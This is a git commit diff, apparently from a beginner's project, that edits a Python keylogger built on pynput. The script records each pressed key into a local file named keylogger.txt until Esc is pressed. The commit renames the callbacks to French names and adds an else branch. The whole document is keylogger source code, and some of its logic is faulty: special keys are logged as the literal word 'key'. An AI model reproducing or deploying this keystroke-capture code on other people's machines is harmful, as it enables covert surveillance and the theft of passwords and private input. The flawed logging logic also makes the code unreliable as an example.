3624fae72ba9b9eb1600562c8862c6486d56eee9
bilel233 <bilel.mjdb@gmail.com>
2024-08-07 11:47:39 +0100

    changement dans le programme

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,8 @@
 from pynput import keyboard
 
-def on_press(key):
+def pression(key):
+    """enregistre la touche pressee dans le fichier"""
+
     try:
         with open("keylogger.txt","a") as f:
             f.write(key.char)
@@ -8,12 +10,20 @@ def on_press(key):
         if key == keyboard.Key.space:
             with open("keylogger.txt","a") as f:
                 f.write("keyboard.Key.space")
+        else:
+            with open("keylogger.txt","a") as f:
+                f.write("key")
+def relachement(key):
+    """sort du programme avec une touche speciale"""
 
-
-def on_release(key):
     if key == keyboard.Key.esc:
         return False
 
 if __name__ == "__main__":
-    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-        listener.join()
+    with keyboard.Listener(on_press=pression,on_release=relachement) as l:
+        l.join()
+
+
+
+
+
